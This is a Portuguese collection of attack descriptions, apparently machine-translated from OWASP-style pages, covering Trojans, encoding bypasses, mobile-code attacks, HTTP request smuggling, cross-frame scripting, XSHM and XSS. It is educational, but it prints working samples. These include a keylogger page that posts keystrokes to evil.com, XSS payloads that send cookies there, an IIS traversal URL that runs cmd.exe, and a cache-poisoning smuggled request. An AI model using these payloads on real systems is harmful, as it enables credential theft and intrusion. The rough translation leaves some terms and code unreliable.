+@ Cavalo de Tróia
+
+Descrição
+
+Um Cavalo de Tróia é um programa que usa o código malicioso se disfarçou como um aplicativo confiável. O código malicioso pode ser injetado em aplicativos benignos, se disfarçou em links de e-mail, ou, às vezes escondidos em páginas JavaScript para fazer ataques furtivos contra Browsers vulneráveis na internet.
+Outros detalhes podem ser encontrados no ataque Man-in-the-browser.
+
+Os 7 tipos principais de Cavalo de Tróia ~
+
+1 - Tróia de acesso remoto (RAT): Projetado para fornecer o controle total da máquina infectada atacante. Cavalo de Tróia normalmente se disfarçou como um utilitário. (Exemplos: Prorat, Turkojan, Bifrost, Stealonely e etc)
+2 - Dados de envio Trojan: cavalo de Tróia que utiliza a tecnologia keylogger para capturar dados confidenciais, como senhas, cartão de crédito e informações bancárias e mensagens instantâneas, e envia-los de volta para o atacante.
+3 - Trojan Destrutivo: cavalo de Tróia projetados para destruir dados armazenados no computador da vítima.
+4 - Trojan Proxy: cavalo de tróia que usa o computador da vítima como um servidor proxy, fornecendo o atacante a oportunidade de executar atos ilícitos do computador infectado, como fraudes bancárias, e até mesmo ataques maliciosos através da internet.
+5 - Trojan FTP: Este tipo de cavalo de tróia usa a porta 21 para permitir que os atacantes para se conectar ao computador da vítima usando o File Transfer Protocol.
+6 - Segurança software disabler Trojan: Este cavalo de tróia é projetado para desativar softwares de segurança como firewall e antivírus, permitindo que um atacante a usar muitas técnicas de invasão para invadir o computador da vítima, e mesmo para infectar mais do que o computador.
+7 - Denial-of-Service ataque Trojan: cavalo de tróia projetado para dar a oportunidade atacante para realizar ataques de negação de serviço a partir do computador da vítima.
+
+Sintomas ~
+Alguns sintomas comuns:
+
+- Auto-mudança de Papel de parede e outras configurações
+- Ponteiro do mouse desaparece
+- Programas de auto-carregamento e descarregamento
+- Janelas com avisos estranhos, mensagens e caixas de perguntas e opções que está sendo exibido constantemente
+e-mail auto cliente enviar mensagens para todos na lista de contatos do usuário
+- Auto fechamento de janelas
+- Auto reeinicialização do sistema
+- Informações da conta e internet em uma mudança constante
+- Largura de banda alta internet sendo usada sem a ação do usuário
+- Alto consumo de recursos do computador (computador fica mais lento)
+- Ctrl + Alt + Del para de funcionar
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Codificação Dupla
+
+Descrição
+
+Esta técnica de ataque consiste em codificar os parâmetros de solicitação do usuário duas vezes em formato hexadecimal a fim de contornar os controles de segurança ou causar um comportamento inesperado do aplicativo. É possível, pois o servidor aceita e processa as solicitações do cliente em muitas formas codificadas.
+Usando dupla codificação é possível contornar os filtros de segurança que apenas decodificam a entrada do usuário uma vez. O segundo processo de decodificação é executado pela plataforma de backend ou módulos que tratam corretamente dados codificados, mas não tem as verificações de segurança correspondentes no local.
+Os atacantes podem injetar dupla codificação em caminhos ou seqüências de consulta para contornar o esquema de autenticação e filtros de segurança em uso pela aplicação web.
+Existem alguns conjuntos de caracteres mais comuns que são utilizados em aplicações de Web ataques. Por exemplo, Path Traversal ataques use ".. /" (dot-dot-slash), enquanto que ataques XSS usam "<" e ">" caracteres. Esses personagens dão uma representação hexadecimal que difere dos dados normais.
+Por exemplo, ".. /" (dot-dot-slash) personagens representam % 2E% 2E% 2f em representação hexadecimal. Quando o símbolo% é codificado novamente, a sua representação em código hexadecimal é 25%. O resultado do processo de codificação dupla ".. /" (dot-dot-slash) seriam% 252E% 252E% 252F:
+- A codificação hexadecimal ".. /" representa "% 2E% 2E% 2f"
+- Depois que codifica a "%" representa a "25%"
+- Duplo codificação de ".. /" representa "% 252E% 252E% 252F"
+
+Exemplo 1 ~
+Este exemplo apresenta uma velha vulnerabilidade conhecida encontrado nas versões do IIS 4.0 e 5.0, onde um atacante pode ignorar um esquema de autorização e ter acesso a qualquer arquivo na mesma unidade como o diretório raiz web devido a um problema com o mecanismo de decodificação. Para mais detalhes sobre a pasta vulnerabilidade travessia, consulte CVE 2001-0333.
+Neste cenário, a vítima tem um diretório executável publicado (por exemplo, cgi) que está armazenado na mesma partição como a pasta de sistema do Windows. Um invasor pode executar comandos arbitrários no servidor web, apresentando o seguinte URL:
+URL original:
+
+
+http://victim/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\
+
+
+No entanto, o aplicativo usa um filtro de verificação de segurança que se recusa pedidos que contenham caracteres como ".. /". Com um duplo codifica a URL, é possível burlar a segurança do filtro:
+Duplo URL codificada:
+
+
+http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\ 
+
+
+Exemplo 2
+A URL duplo codificado pode ser usado para executar um ataque XSS, a fim de evitar um módulo de detecção de built-in XSS. Dependendo da implementação, o primeiro processo de decodificação é feita por protocolo HTTP ea URL codificada resultante irá ignorar o filtro XSS, uma vez que não dispõe de mecanismos para melhorar a detecção. Um exemplo simples XSS seria:
+
+
+<script>alert('XSS')</script>
+
+
+Este código malicioso poderia ser inserido em uma aplicação vulnerável, resultando em uma janela de alerta com a mensagem "XSS". No entanto, a aplicação web pode ter um filtro de caráter que proíbe caracteres como "<", ">" e "/", uma vez que eles são usados ​​para realizar ataques a aplicações web. O invasor pode usar a técnica de dupla codificação para ignorar o filtro e explorar a sessão do cliente. O processo de codificação para esse script Java é:
+
+
+Char	 Codificação Hex   Then encoding '%'	 Dupla codificação
+“<”	 “%3C”	               “%25”	 '		“%253C”
+“/”	 “%2F”	               “%25”    		“%252F”
+“>”	 “%3E”	               “%25”	 		“%253E”
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Codificação Unicode
+
+Descrição
+
+O ataque tem como objetivo explorar falhas no mecanismo de decodificação implementado em aplicações ao formato de dados Unicode decodificação. Um atacante pode usar esta técnica para codificar determinados caracteres no URL para contornar os filtros de aplicação, acessando assim recursos restritos no servidor Web ou para forçar a navegação para páginas protegidas.
+
+Exemplos
+
+Considere uma aplicação web que restringiu diretórios ou arquivos (por exemplo, um arquivo contendo nomes de usuário da aplicação: appusers.txt). Um atacante pode codificar a sequência de caracteres ".. /" (Ataque de Caminho Transversal) usando o formato Unicode e tentativa de acessar o recurso protegido, como se segue:
+
+Ataque de Caminho Transversal com URL original (sem codificação Unicode):
+
+
+http://vulneapplication/../../appusers.txt
+
+
+Ataque de Caminho Transversal de URL com codificação Unicode:
+
+
+http://vulneapplication/%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFappusers.txt
+
+A codificação Unicode para o URL acima irá produzir o mesmo resultado que o primeiro URL (Ataque de Caminho Transversal). No entanto, se a aplicação tem um mecanismo de filtro de segurança de entrada, pode recusar qualquer solicitação que contém ".. /" em sequência, bloqueando assim o ataque. No entanto, se este mecanismo não considera a codificação de caracteres, o atacante pode ignorar e acessar o recurso protegido.
+Outras consequências deste tipo de ataque são escalação de privilégios, a execução de código arbitrário, modificação de dados, e negação de serviço.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ PHREAKING ~ Código móvel: campo público não-final
+
+Descrição
+
+Este ataque tem como objetivo manipular as variáveis​públicas não-finais utilizadas em código móvel, injetando valores maliciosos sobre ela, principalmente em aplicações Java e C + +.
+Quando uma variável de membro público ou classe usado em código móvel não é declarada como final, os seus valores podem ser maliciosamente manipulados por qualquer função que tem acesso a ele, a fim de estender o código do aplicativo ou adquirir informações críticas sobre o aplicativo.
+
+Exemplos
+
+Uma aplicação Java a partir de um determinado aplicativo é adquirida e subvertida por um invasor. Em seguida, ele faz com que a vítima aceite e execute um Trojan ou código malicioso que foi preparado para manipular o estado e o comportamento dos objetos não-finais. Este código é instanciado e executado de forma contínua usando o padrão JVM na máquina da vítima. Quando a vítima invoca o applet Java do aplicativo original usando a mesma JVM, o processo malicioso pode ser misturado com o applet do original, portanto, modifica valores de objetos não-finais e executado sob as credenciais da vítima.
+No exemplo a seguir, a classe "any_class" é declarada como final e variável "SERVER_ADDR" não é:
+
+
+public final class any_class extends class_Applet {
+public URL server_addr;
+…
+}
+
+
+Quando uma variável é declarada como final, seu valor não pode ser modificado.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ PHREAKING ~ Código móvel: invocando código móvel não confiável
+
+Descrição
+
+Este ataque consiste de uma manipulação a um código de celular, a fim de executar as operações maliciosas no lado do cliente. Ao interceptar o tráfego do cliente usando a técnica man-in-the-middle, um usuário mal-intencionado poderia modificar o código móvel original com operações arbitrárias que serão executados na máquina do cliente em suas credenciais. Em outro cenário, o código malicioso móvel poderia ser hospedado em um site não confiável ou pode ser permanentemente injetado em um site vulnerável através de um ataque de injeção. Este ataque pode ser realizado ao longo dos aplicativos Java ou C + + e afeta qualquer sistema operacional.
+
+Exemplos
+
+O código a seguir demonstra como este ataque poderia ser realizado através de um applet Java.
+
+
+
+ // here declarer a object URL with the path of the malicious class
+ URL[] urlPath= new URL[]{new URL("file:subdir/")};
+
+ // here generate a object “loader” which is responsible to load a class in the URL path
+ URLClassLoader  classLoader = new URLClassLoader(urlPath); 
+
+ //here declare a object of a malicious class contained in “classLoader”
+ Class loadedClass = Class.forName("loadMe", true, classLoader);<br><br>
+
+
+Para resolver este problema, é necessário usar algum tipo de mecanismo de integridade, para assegurar que o código móvel não foi modificado.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ PHREAKING ~ Código móvel: sequestro de objeto
+
+Descrição
+
+Este ataque consiste em uma técnica para criar objetos sem métodos de construtores, aproveitando o clone () método de aplicações baseadas em Java.
+Se uma determinada classe implementa método cloneable () declarado como público, mas não tem um método construtor público nem é declarada como final, é possível estendê-la para uma nova classe e criar objetos usando o método clone ().
+O método clonable () certifica que o método clone () funciona corretamente. Um objeto clonado tem os mesmos atributos (valores variáveis) do objeto original, mas os objetos são independentes.
+
+Exemplos
+
+Neste exemplo, uma classe pública "bankaccount" implementa o método clonable (), que declara: "Object clone (string AccountNumber)":
+
+
+public class BankAccount implements Cloneable{
+public Object clone(String accountnumber) throws                                                                                                  
+CloneNotSupportedException
+     {
+      Object returnMe = new BankAccount(account number);
+      …
+     }
+}
+
+
+Um atacante pode implementar uma classe pública maliciosa que estende a classe BankAccount pai, como segue:
+
+
+
+public class MaliciousBankAccount extends BankAccount implements   
+                                                      Cloneable{
+public Object clone(String accountnumber) throws CloneNotSupportedException 
+              {
+               Object returnMe = super.clone();
+               …
+              }
+}
+
+
+Uma aplicação Java a partir de um determinado aplicativo é adquirida e subvertida por um invasor. Em seguida, ele faz com que a vítima aceite e execute um Trojan ou código malicioso que foi preparado para manipular o estado e o comportamento dos objetos. Este código é instanciado e executado de forma contínua usando o padrão JVM na máquina da vítima. Quando a vítima invoca o applet Java do aplicativo original usando a mesma JVM, então os clones atacante da turma, ele manipula os valores de atributos e, em seguida, substitui o objeto original para o mal-intencionado.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Consumo de recursos assimétricos (amplificação)
+
+Descrição
+
+Consumo de recursos assimétricos consiste em um atacante forçando uma aplicação web para consumir recursos excessivos quando o aplicativo não consegue liberar ou incorretamente liberar, um recurso do sistema.
+
+Exemplos
+
+Exemplo 1
+O método a seguir nunca fecha o identificador de arquivo se abre. O método para StreamReader eventualmente chama Close () Finalize (), mas não há garantia de quanto tempo vai demorar antes que o finalize () método seja invocado. Na verdade, não há nenhuma garantia de que finalize () vai ser invocado alguma vez. Em um ambiente ocupado, isso pode resultar no uso de todos os identificadores de arquivo disponíveis.
+
+"private void processFile(string fName) {
+ StreamWriter sw = new
+ StreamWriter(fName);
+ string line;
+ while ((line = sr.ReadLine()) != null) processLine(line);
+}"
+Depois de usar-se todos os identificadores (descritores de arquivo) a aplicação pode tornar-se muito instável, lento, ou pode parar de funcionar, afetando significativamente a usabilidade aplicações.
+
+Exemplo 2
+
+Em condições normais, o seguinte código C# executa uma consulta de banco de dados, processa os resultados retornados pelo banco de dados, e fecha o objeto SqlConnection alocado. Se ocorrer uma exceção durante a execução do SQL, ou o processamento dos resultados, o código não fechar o objeto SqlConnection. Se isso acontecer várias vezes, o banco de dados é executado fora de cursores disponíveis e não é capaz de executar mais nenhuma dúvida.
+C# Exemplo:
+"...
+SqlConnection conn = new SqlConnection(connString);
+SqlCommand cmd = new SqlCommand(queryString);
+cmd.Connection = conn; conn.Open();
+SqlDataReader rdr = cmd.ExecuteReader();
+HarvestResults(rdr);
+conn.Connection.Close();
+..."
+O número de conexões concurent às bases de dados é muitas vezes menor do que o número máximo de possíveis cabos para o sistema de usar. Isso permite que os gargalos de aplicações para impactar ou parar negative a candidatura.
+
+Exemplo 3
+
+Se um aplicativo pode manipular N conexões concurent e não implementa um mecanismo adequado para desconectar clientes (por exemplo, tempos de espera), torna-se muito fácil de afetar adversamente o aplicativo simplesmente estabelecendo perto de ligações N. Além disso, essas ligações múltiplas podem ser usadas para simular a interação com a aplicação, até esgotamento dos recursos disponíveis.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Contrabando de Requisição HTTP
+
+Descrição
+
+O Contrabando de Requisição HTTP explora uma análise incompleta dos dados apresentados feitas por um sistema intermediário HTTP trabalhando como um proxy. Contrabando de Requisição HTTP  consiste no envio de uma solicitação HTTP especialmente formatada que será analisada de uma forma diferente pelo sistema de proxy e pelo sistema final, de modo que o invasor pode contrabandear um pedido para um sistema sem o outro estar ciente disso. Este ataque faz com que seja possível explorar outros ataques, como envenenamento de cache, seqüestro de sessão, Cross-site Scripting (XSS) e, mais importante, a capacidade de ignorar a proteção de firewall de aplicação web.
+Para explorar o Contrabando de Requisição HTTP, devem existir algumas condições específicas, tais como a presença de sistema de proxy específico e versão, como SunOne Proxy 3.6 (SP4) ou FW-1/FP4-R55W beta ou uma vulnerabilidade de XSS no servidor web.
+
+Basicamente, o ataque consiste em submeter um pedido HTTP que encapsula um segundo pedido HTTP no mesmo cabeçalho, como mostrado abaixo.
+
+
+
+GET /some_page.jsp?param1=value1&param2=
+Content-Type: application/x-www-form-
+Content-Length: 0
+Foobar: GET /mypage.jsp HTTP/1.0
+Cookie: my_id=1234567
+Authorization: Basic ugwerwguwygruwy
+
+
+
+Neste caso, o primeiro cabeçalho HTTP é analisado pelo sistema de proxy e a segunda pelo sistema final, permitindo que o invasor ignore o controle de acesso do proxy.
+
+O ataque pode ser explorado de diversas maneiras como relatado pelo papel "HTTP Request Contrabando" por Watchfire, por isso é possível realizar esses ataques:
+• Cache Poisoning Web 
+• Firewall / IPS / IDS evasão
+• Encaminhar vs atrasados ​​HRS
+• Pedido de Sequestro
+• Solicitação de Credencial Sequestro
+
+Exemplos
+
+Exemplo 1 - Explorando Envenenamento de Cache ~
+Nosso primeiro exemplo demonstra um ataque HRS clássico. Suponha que uma solicitação POST contém dois cabeçalhos "Content-Length", com valores conflitantes. Alguns servidores (por exemplo, IIS e Apache) rejeita tal pedido, mas verifica-se que outros optam por ignorar o cabeçalho problemático. Qual dos dois cabeçalhos é a problemática? Felizmente para o atacante, servidores diferentes escolhem respostas diferentes. Por exemplo, SunONE W / S 6.1 (SP1) usa o primeiro cabeçalho "Content-Length", enquanto SunONE Proxy 3.6 (SP4) converte o segundo cabeçalho (note que ambas as aplicações são da família SunONE). Deixemos que o SITE seja o nome DNS do SunONE W / S por trás do Proxy SunONE. Suponha que "/ veneno.html" é uma página estática (em cache) HTML no W / S. Aqui está o ataque HRS que explora o conflito entre os dois servidores:
+
+
+1 POST http://SITE/foobar.html HTTP/1.1
+2 Host: SITE
+3 Connection: Keep-Alive
+4 Content-Type: application/x-www-form-urlencoded
+5 Content-Length: 0
+6 Content-Length: 44
+7 [CRLF] 
+8 GET /poison.html HTTP/1.1
+9 Host: SITE
+10 Bla: [space after the "Bla:", but no CRLF]
+11 GET http://SITE/page_to_poison.html HTTP/1.1
+12 Host: SITE
+13 Connection: Keep-Alive
+14 [CRLF]
+
+
+[Note que cada linha termina com um CRLF ("\ r \ n"), exceto para a linha 10.] Vamos analisar o que acontece quando este pedido é enviado para a W / S através do servidor proxy. Primeiro, o proxy analisa a solicitação POST em linhas 1-7, e encontra os dois headers "Content-Length". Como mencionamos anteriormente, ele decide ignorar o cabeçalho da primeira, por isso assume o pedido tem um corpo de comprimento 44 bytes. Portanto, trata os dados em linhas 8-10 como o primeiro corpo de solicitação (linhas 8-10, em roxo, contém exatamente 44 bytes). O procurador, então, analisa linhas 11-14 , que trata como segundo pedido do cliente. Agora vamos ver como a W / S interpreta a mesma capacidade de carga, uma vez que foi encaminhado a ele pelo proxy. Ao contrário do proxy, a W / S usa o primeiro cabeçalho "Content-Length": na medida em que está em causa, a primeira solicitação POST não tem corpo, eo segundo pedido é o GET na linha 8 (note que o GET na linha 11 é analisado pela W / S como o valor do cabeçalho "bla" na linha 10). Para resumir, esta é a forma como os dados são particionados pelos dois servidores:
+
+				1ª requisição      2ª requisição
+       SunONE Proxy             linhas 1-10         linhas 11-14
+       SunONE W/S               linhas 1-7          linhas 8-14
+
+
+Em seguida, vamos ver quais as respostas são enviadas de volta para o cliente. Os pedidos da W / S vê são "POST / foobar.html" (da linha 1) e "GET / veneno.html" (de linha 8), por isso envia duas respostas com o conteúdo do "foobar.html" página e na página "veneno.html", respectivamente. O proxy combina essas respostas para os dois pedidos que acha que foram enviados pelo cliente - "POST / foobar.html" (linha 1) e "GET / page_to_poison.html" (linha 11). Uma vez que a resposta é armazenado em cache (nós assumimos "poison.html" é uma página em cache), o proxy armazena o conteúdo de "veneno.html" sob a URL "page_to_poison.html", e pronto: o cache é envenenado! Qualquer cliente que solicita "page_to_poison.html" do procurador receberia a página "veneno.html". A nota técnica: Linhas 1-10 e 11-14 devem ser enviados em dois pacotes separados, desde SunONE Proxy não pedidos pipeline no mesmo pacote.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Criptoanálise
+
+Descrição
+
+Criptoanálise é um processo de encontrar pontos fracos em algoritmos criptográficos e usar essas fraquezas para decifrar o texto cifrado sem conhecer a chave secreta (exemplo dedução). Às vezes não é a fraqueza no próprio algoritmo criptográfico, mas sim na forma como é aplicada que faz criptoanálisis bem sucedidas. Um atacante pode ter outros objetivos, bem como, tais como:
+
+- Total Break - Encontrar a chave secreta.
+- Dedução Global - Encontrar um algoritmo funcionalmente equivalente para criptografia e descriptografia que não requer o conhecimento da chave secreta.
+- Informações Dedução - Ganhando algumas informações sobre textos planos ou mensagens cifradas que não eram conhecidas anteriormente.
+- Algoritmo Distinguido - O atacante tem a capacidade de distinguir a saída da encriptação (encriptado) a partir de uma permutação aleatória de bits.
+O objetivo do atacante realizar criptoanálise vai depender das necessidades específicas do atacante em um determinado contexto ataque. Na maioria dos casos, se a criptoanálise é bem sucedida em tudo, um atacante não vai ser capaz de ir além de ser capaz de deduzir algumas informações sobre o texto simples (meta 3). No entanto, isto pode ser suficiente para um atacante, dependendo do contexto.
+
+Exemplos
+
+Um exemplo muito fácil de entender (mas totalmente inaplicável às modernas cifras criptográficas) é uma técnica de criptoanálise chamada análise de frequência que pode ser aplicada com sucesso para os algoritmos de criptografia clássicos básicos que realizaram substituição monoalfabética substituindo cada letra do texto com sua carta de mapeamento predeterminado do mesmo alfabeto. Isso foi considerado um avanço em relação a técnica mais básica que simplesmente muda todas as letras do texto original por um número constante de posições e substitui as letras originais com a nova carta como a posição do alfabeto resultante. Embora as cifras de substituição monoalfabética sejam resistentes à força bruta cega, eles podem ser facilmente quebrados com nada mais do que uma caneta e papel. Análise criptoanálise de freqüência usa o fato de que a linguagem natural não é aleatória e a substituição monoalfabética não esconde as propriedades estatísticas da linguagem natural. Então, se a letra "E" em uma linguagem portuguesa ocorre com uma certa freqüência conhecida (cerca de 12,7%), seja qual for "E" foi substituído por chegar ao texto cifrado, irá ocorrer com a freqüência similar. Tendo esta informação de freqüência permite que o criptoanalista para determinar rapidamente as substituições e decifrar o texto cifrado. Técnicas de análise de frequência não são aplicáveis ​​a cifras modernas, todas elas são resistentes a ele (a não ser que este é um caso grave de um algoritmo de criptografia caseiros). Este exemplo é apenas para ilustrar um exemplo rudimentar de criptoanálise.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Cross Frame Scripting
+
+Descrição
+
+Cross-Frame Scripting (XFS) é o ataque do lado do cliente com relação ao Cross-site Scripting (XSS). Em um ataque XFS, o invasor explora um bug cross-frame-scripting específico em um navegador da Web para acessar dados confidenciais em um site de terceiros. O atacante induz o usuário do navegador para navegar até uma página web controlado pelo invasor; a página do atacante carrega uma página de terceiros em um quadro HTML e, em seguida, executa um código javascript na página do atacante e rouba dados da página de terceiros.
+XFS também é por vezes utilizado para descrever um ataque XSS que usa uma estrutura de HTML no ataque. Por exemplo, um invasor pode explorar a Cross Flaw Site Scripting para injetar um quadro em uma página da web de terceiros, ou que um atacante pode criar uma página que usa um quadro para carregar uma página de terceiros com uma falha de XSS.
+
+Exemplos
+
+XFS Ataque Contra IE (Internet Explorer)
+Para explorar o bug do IE é necessário vazamentos de eventos do teclado através de conjuntos de quadros, um atacante pode criar uma página web em evil.com, que os controles de atacante, incluem-se na página evil.com e um quadro visível exibe a página de login para example.com. O atacante pode ocultar as bordas do quadro e ampliar o quadro para cobrir toda a página, de modo que ele olha para o usuário do navegador como ele ou ela está realmente visitar example.com O atacante registra alguns javascript na página evil.com que escuta todos os eventos-chave na página. Normalmente, este ouvinte iria ser notificado de eventos somente da página evil.com - mas por causa do bug do navegador, este ouvinte é notificado também de eventos da página em que example.com emoldurada. Assim, cada tecla faz com que o usuário do navegador no quadro example.com, ao tentar entrar em example.com, pode ser capturada pelo atacante, e comunicadas ao evil.com:
+
+
+<!-- http://evil.com/example.com-login.html -->
+<head>
+<script>
+// array of user keystrokes
+var keystrokes = [];
+// event listener which captures user keystrokes
+document.onkeypress = function() {
+    keystrokes.push(window.event.keyCode);
+}
+// function which reports keytrokes back to evil.com every second
+setInterval(function() {
+    if (keystrokes.length) {
+        var xhr = newXHR();
+        xhr.open("POST", "http://evil.com/k");
+        xhr.send(keystrokes.join("+"));
+    }
+    keystrokes = [];
+}, 1000);
+// function which creates an ajax request object
+function newXHR() {
+    if (window.XMLHttpRequest)
+        return new XMLHttpRequest();
+    return new ActiveXObject("MSXML2.XMLHTTP.3.0");
+}
+</script>
+</head>
+<!-- re-focusing to this frameset tricks browser into leaking events -->
+<frameset onload="this.focus()" onblur="this.focus()">
+<!-- frame which embeds example.com login page -->
+<frame src="http://example.com/login.html">
+</frameset>
+
+
+XSS ataque usando Frames ~
+Para explorar a falha Cross Site Scripting em uma página da web de terceiros em exemplo.com, o atacante pode criar uma página web em evil.com, que os controles de atacante, e incluem um iframe escondido na página evil.com. O iframe carrega a página example.com falho, e injeta algum script para ele através da falha de XSS. Neste exemplo, a página example.com imprime o valor de "q" parâmetro de consulta da URL da página de conteúdo da página, sem fugir do valor. Isso permite que o invasor injetar um pouco de javascript na página que rouba example.com example.com cookies do navegador do usuário e envia o cookie através de uma solicitação falsa imagem de evil.com (src URL do iframe é enrolado para legibilidade):
+
+
+<iframe style="position:absolute;top:-9999px" src="http://example.com/↵
+    flawed-page.html?q=<script>document.write('<img src=\"http://evil.com/↵
+    ?c='+encodeURIComponent(document.cookie)+'\">')</script>"></iframe>
+
+
+O iframe está escondido fora da tela, de modo que o usuário do navegador não terá qualquer idéia de que ele ou ela tenha apenas "visitado" a página exemple.com. No entanto, este ataque é efectivamente o mesmo que um ataque XSS convencional, uma vez que o atacante pode simplesmente ter reencaminhado o utilizador directamente para a página example.com, usando uma variedade de métodos, incluindo um elemento meta como este (novamente, o URL do elemento meta é enrolado para legibilidade):
+
+
+<meta http-eqiv="refresh" content="1;url=http://example.com/↵
+    flawed-page.html?q=<script>document.write('<img src=\"http://evil.com/↵
+    ?c='+encodeURIComponent(document.cookie)+'\">')</script>">
+
+
+A única diferença é que, ao usar um iframe, o atacante pode esconder o quadro off-screen - de modo que o usuário do navegador não terá qualquer idéia de que ele ou ela apenas "visitou" o examplo.com. Ao usar um redirecionamento para navegar diretamente para exemplo.com, o navegador irá exibir a url exemplo.com na barra de endereços do navegador, e a página exemplo.com na janela do navegador, de modo que o usuário do navegador estará ciente de que ele ou ela é visitante da exemplo.com.
+Outro ataque XSS Usando Frames ~
+Para explorar a mesma falha Cross Site Scripting que acima de exemplo.com (que imprime o valor de "q" parâmetro de consulta da URL da página de conteúdo da página sem escapar o valor), o atacante pode criar uma página web em evil.com , que os controles atacante, que inclui um link como o seguinte, e induzir o usuário a clicar no link. Este link injeta um iframe na página exemplo.com explorando a falha de XSS com o parâmetro "q" de consulta, o iframe é executado através de algum javascript para roubar a exemplo.com com cookies do navegador do usuário e envia-lo através de uma solicitação falsa de uma imagem na evil.com (a URL é enrolado para legibilidade):
+
+http://example.com/flawed-page.html?=<iframe src="↵
+    javascript:document.body.innerHTML=+'<img src=\"http://evil.com/↵
+    ?c='+encodeURIComponent(document.cookie)+'\">'"></iframe>
+
+
+Mais uma vez, este ataque é efetivamente o mesmo que um ataque XSS convencional, o atacante simplesmente usa o atributo src do elemento iframe injetado como um veículo para executar um código javascript na página atacada.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Cross Site História Manipulação (XSHM)
+
+Descrição
+
+História Cross-Site Manipulação (XSHM) é um SOP (Same Origin Policy) quebra de segurança. SOP é o conceito de segurança mais importante de navegadores modernos. SOP significa que as páginas da web de diferentes origens por design não podem se comunicar uns com os outros. História Cross-Site Manipulação baseia-se no fato de violação que o objeto histórico do navegador do lado do cliente não está devidamente dividido em uma base por site. Manipulando o histórico do navegador pode levar a SOP à se comprometer, permitindo uma CSRF bi-direcional e outras explorações, tais como: violação de privacidade do usuário, detecção de status de login, mapeamento de recursos, inferimento de informações sigilosas, acompanhamento de atividade dos usuários e roubo do parâmetro URL.
+
+Exemplos
+
+O que é o Estado de fuga? ~
+É quando há um Vazamento de condição que ocorre quando um atacante pode inferir um valor sensível de uma instrução condicional em um aplicativo atacado. Por exemplo, se um site contém a seguinte lógica:
+
+
+Page A: If (CONDITION)
+           Redirect(Page B)
+
+
+Um atacante pode executar o CSRF e obter uma indicação sobre o valor da condição de feedback. Este ataque é executado a partir de um local invasor. O site, em seguida, envia uma solicitação de Cross-Site para um site vítima, e através da manipulação do objeto Histórico, recebe um feedback com as informações necessárias que vazou de um site de vítima. É importante mencionar que o comando de redirecionamento pode aparecer explicitamente no código, ou pode ser preenchido pelo ambiente operacional.
+Vetor de ataque:
+
+1. Criar IFRAME com src = Página B
+2. Lembre-se o valor atual do history.length
+3. Alterar src do IFRAME para a Página A
+4. Se o valor da history.length é o mesmo, então a condição é verdadeira
+
+Detecção de login ~
+A demonstração a seguir para IE e Facebook pode mostrar como é possível identificar se os usuários estão usando facebook: "Estou usando Facebook?"
+
+Interferência de Informações Cross-Site ~
+É possível que as informações sensíveis à inferência a partir de uma página em uma origem diferente, se ele implementa um condicional redirecionamento. Suponha que, em um aplicativo de RH que não é publicamente acessível, um usuário pode pesquisar funcionários legais pelo nome, salário e outros critérios. Se a pesquisa não tem resultados, um redirecionamento de comando é então executado para um "Not Found" na página. Ao enviar a seguinte URL:
+
+
+http://Intranet/SearchEmployee.aspx?name=Jon&SalaryFrom=3000&SalaryTo=3500
+
+
+e observando o redirecionamento NotFound, os atacantes podem informações confidenciais inferência sobre o salário de um trabalhador.
+
+Isso pode ser feito usando o seguinte vetor de ataque:
+1. Criar IFRAME com src = "NotFound.aspx"
+2. Lembre-se o valor atual do history.length
+3. Alterar src do IFRAME para "SearchEmployee.aspx? Name = Jon & SalaryFrom = 3000 & SalaryTo = 3500"
+4. Se o valor da history.length permanece o mesmo, em seguida, a sua pesquisa não tem resultados
+
+Ao repetir o ataque acima e tentar diferentes valores dos parâmetros de salário, um atacante pode obter informações muito sensíveis do salário de qualquer funcionário. Isso é muito grave pois é um Cross-Site vazamento de informações. Se um aplicativo tem uma funcionalidade como uma página de pesquisa com condicional redirecionamento, então esta aplicação é vulnerável a XSHM e, essencialmente, é um semelhante a uma exposição direta ao XSS Universal - a aplicação em si é XSS-seguro, mas se executá-lo a partir de um local diferente dentro de um IFRAME torna-o  vulnerável.
+############################# FIM
+
+
+
+
+
+COMEÇO #############################
+@ Cross-site Scripting (XSS)
+
+Geral
+
+Ataques Cross-Site Scripting são um tipo de problema de injeção, em que scripts maliciosos são injetados nos sites de outra forma benigna e confiável. Ataques de cross-site scripting (XSS) ocorre quando um invasor usa uma aplicação web para enviar código malicioso, geralmente na forma de um script do lado do browser, para um usuário final diferente. Falhas que permitem que esses ataques para ter sucesso são bastante generalizada e ocorrer em qualquer lugar de uma aplicação web usa a entrada de um usuário na saída ele gera sem validar ou codificá-lo.
+Um atacante pode usar XSS para enviar um script malicioso para um usuário desavisado. O navegador do usuário final não tem como saber que o script não deve ser confiável, e executará o script. Porque ele acha que o roteiro veio de uma fonte confiável, o script malicioso pode acessar os cookies, tokens de sessão, ou outras informações confidenciais retidos pelo navegador e usado com esse site. Esses scripts podem até mesmo reescrever o conteúdo da página HTML.
+
+Descrição
+
+Ataques Cross-Site Scripting (XSS) ocorrem quando:
+1 - Dados entram em uma aplicação Web através de uma fonte não confiável, mais freqüentemente um pedido web.
+2 - Os dados são incluídos no conteúdo dinâmico, que é enviado para um usuário da web, sem ser validado por um código malicioso.
+O conteúdo malicioso enviado para o navegador da web, muitas vezes toma a forma de um segmento de JavaScript, mas também pode incluir código HTML, Flash ou qualquer outro tipo de código que o navegador pode executar. A variedade de ataques baseados em XSS é quase ilimitada, mas eles geralmente incluem transmissão de dados privados, como biscoitos ou outras informações de sessão para o atacante, redirecionando a vítima para conteúdo web controlado pelo atacante, ou realizar outras operações maliciosos na máquina do usuário sob o guise do site vulnerável.
+
+Armazenados e refletidos ataques XSS ~
+Ataques XSS podem geralmente ser classificados em duas categorias: armazenados e refletida. Há um terceiro tipo muito menos conhecido de um ataque XSS chamada XSS baseado em DOM.
+
+Ataques XSS armazenados ~
